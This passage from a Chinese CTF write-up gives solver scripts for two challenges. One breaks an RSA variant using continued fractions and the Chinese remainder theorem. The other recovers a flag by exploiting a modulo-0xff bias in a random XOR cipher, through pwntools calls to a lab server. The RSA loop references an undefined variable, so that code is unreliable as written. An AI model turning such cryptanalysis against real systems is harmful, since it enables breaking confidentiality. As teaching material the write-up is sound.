$\phi _{n{_1}} = (n_1-1)(n_2-1) = a_1a_2b_1b_2=v_1$ 

$\phi _{n{_2}} = (n_3-1)(v_2-1) = a_1b_2kb_1$

由`k=(a3*inverse(a3,v1)-1)//v1` 、`e=a3`知：

$k = (e*inv(e, \phi_{n_1}) -1) // phi = ed-1 // \phi_{n_1} = k*\phi_{n_1} // \phi_{n_1} = k$

解题思路也是明确的，知道e了，只要知道一个phi就可以求出对应私钥d，便可求解明文m

试了许多方式，题目说数学很重要，以为是n1与n2相乘后有什么关系，但形式越发复杂，无果

加减乘都无效后，尝试除，起初也没看到直接的破题点

后看着题目math1，猛然想起除法所对应连分数，试着分析了下

$\frac{N2}{N1}=\frac{(a_1b_2+1)(kb_1+1)}{(a_1b_1+1)(a_2b_2+1)}≈\frac{a_1b_2kb_1}{a_1b_1a_2b_2}=\frac{k}{a_2}$

![](https://image.0error.net/img/202220220619113551.png)

再根据Legendre理论，$\frac{k}{a_2}$为$\frac{N2}{N1}$连分数

便可求出一系列的k、a2可能值

又有 $ed-1=k \phi_{n_1}$,所以：

$$\phi_{n_1} ≡ (-1)*k^{-1} \mod e$$

以及

$$\phi_{n_1} ≡ a_1a_2b_1b_2  = 0 \mod a_2$$

利用中国剩余定理联立之，得到$\phi_{n_1} \mod ea_2$

最后，为进一步确定$\phi_{n_1}$值，利用：$|𝜙−N1|=|(n_1−1)(n_2−1)−n_1n_2|=|-n_1−n_2+1|≈n_1+n_2 ≤ 2^{513}$

```
import gmpy2
import libnum
from tqdm import tqdm


N1 = 112187114035595515717020336420063560192608507634951355884730277020103272516595827630685773552014888608894587055283796519554267693654102295681730016199369580577243573496236556117934113361938190726830349853086562389955289707685145472794173966128519654167325961312446648312096211985486925702789773780669802574893
N2 = 95727255683184071257205119413595957528984743590073248708202176413951084648626277198841459757379712896901385049813671642628441940941434989886894512089336243796745883128585743868974053010151180059532129088434348142499209024860189145032192068409977856355513219728891104598071910465809354419035148873624856313067
e = 86905291018330218127760596324522274547253465551209634052618098249596388694529
enc1 = 71281698683006229705169274763783817580572445422844810406739630520060179171191882439102256990860101502686218994669784245358102850927955191225903171777969259480990566718683951421349181856119965365618782630111357309280954558872160237158905739584091706635219142133906953305905313538806862536551652537126291478865



# c = continued_fraction(int(N2) / int(N1)) 
# sage里int不太对
c = continued_fraction(Integer(N2) / Integer(N1))
for i in tqdm(range(1, 211)):
    a2 = c.denominator(i)
    k = c.numerator(i)
    if gmpy2.gcd(k, e) != 1:
        continue
    tmp = gmpy2.invert(k, e)
    res = (-1*tmp) % e
    phi_ = crt(res, 0, e, a2)
    bound = e * a2 // gmpy2.gcd(e, a2)  # lcm

    phi1 = phi_ + (N1 // bound) * bound - 100 * bound  # phi1
    for j in range(211):
        if gmpy2.gcd(e, st) != 1:
            phi1 += bound
            continue
        d1 = gmpy2.invert(e, phi1)
        flag = libnum.n2s(int(pow(enc1, d1, N1)))
        if b"flag" in flag:
            print(flag)
        phi1 += bound
```

![](https://image.0error.net/img/202220220619113632.png)

### Rand0m3 (200)

#### 题目

```
#!/usr/bin/python3
# Rand0m3
import os, sys
import struct

def _print(content, end = None):
    if end != None:
        print(content, end = end)
    else:
        print(content)
    sys.stdout.flush()

def read_flag():
    with open("flag", "r") as f:
        res = f.read()
    return res

def print_prompt():
    _print("1. encrypt input")
    _print("2. decrypt input")
    _print("3. encrypt flag")
    _print("4. exit")
    _print(">> ", end = "")

def read_int():
    return int(read_string())

def read_string():
    return input().strip()

def get_random_u8(): #  get_random_u8()？？
    return struct.unpack("<B", os.urandom(1))[0]

def encrypt(s, k):
    res = ""
    if k <= len(s):
        _print("[!] key shold be larger then len(pt) for safty!!")
        return ""
    for i, c in enumerate(s):
        enc = (get_random_u8() + k * i) % 0xff
        enc = ord(c) ^ enc
        res += hex(enc)[2:].rjust(2, "0")
    return res

def decrypt(s, k):
    _print("[*] Give me the paper about predicting urandoGive me the paper about predicting urandomm")
    _print("[*] ...Then i'll decrypt your input ;)")
    return ""

if __name__ == "__main__":
    flag = read_flag()
    while True:
        print_prompt()
        c = read_int()
        if c == 1:
            _print("key >> ", end = "")
            key = read_int()
            _print("pt >> ", end = "")
            pt = read_string()
            _print("result : %s"%encrypt(pt, key))
        elif c == 2:
            _print("key >> ", end = "")
            key = read_int()
            _print("ct >> ", end = "")
            ct = read_string()
            _print("result : %s"%decrypt(ct, key))
        elif c == 3:
            _print("key >> ", end = "")
            key = read_int()
            _print("result : %s"%encrypt(flag, key))
        elif c == 4:
            _print("bye!!")
            exit(0)
        else:
            _print("invalid option...")
```

#### 题解

巧，上个月刷到原题了，当时没写出来

赛后跟着[wp](https://kangmyoungseok.github.io/study/study10/)尝试复现了下，居然撞上了

察觉后，觉得略有不同，在交互上卡了好一会，最后发现确实是一致的

想清楚了，思路也清晰

首先，关注题目中的加密代码

```
def encrypt(s, k):
    res = ""
    if k <= len(s):
        _print("[!] key shold be larger then len(pt) for safty!!")
        return ""
    for i, c in enumerate(s):  # i 为index位置， c为s[i]
        enc = (get_random_u8() + k * i) % 0xff  # 0到254
        enc = ord(c) ^ enc  # 唯独不可能与0b11111111异或
        res += hex(enc)[2:].rjust(2, "0")  # 补齐两位
    return res
```

破题点在于`% 0xff`，这样导致第一步的enc范围固定下来，只能是0到254

其后，`enc = ord(c) ^ enc`，那么`ord(c)`就不可能与0b11111111（255）异或

所以为确定一位flag字符，只要进行多次encrypt，在0到255中排除到只剩1个数，它就是flag[i]^255(key不妨就设为255)的结果

那么，都确定好后，根据异或可逆性质再异或回来即可

```
from pwn import *

p = remote('172.16.30.220', 58005)  # 记得改ip 端口
key = 255

p.sendlineafter('>> ', '3')  # 模式3
p.sendlineafter('key >> ', '255')  # 输入key值
p.recvuntil('result : ')  # 准备接受enc(flag, key)

enc_flag = p.recvline()
flag_len = len(enc_flag) // 2
flag_set = [list(range(256)) for _ in range(flag_len)]  # 存放每一位可能的flag_enc
flag = [0 for x in range(flag_len)]  # flag初始化为一串0

while True:
    p.sendlineafter('>> ', '3')
    p.sendlineafter('key >> ', '255')
    p.recvuntil('result : ')

    enc_flag = bytes.fromhex(p.recvline()[:-1].decode())

    for i in range(flag_len):
        if flag_set[i].count(enc_flag[i]) == 1:
            flag_set[i].remove(enc_flag[i])

        if len(flag_set[i]) == 1:
            flag[i] = chr(flag_set[i][-1] ^ key)

    print([len(x) for x in flag_set])

    if 0 not in flag:  # 校验完毕
        break

print(''.join(flag))
```

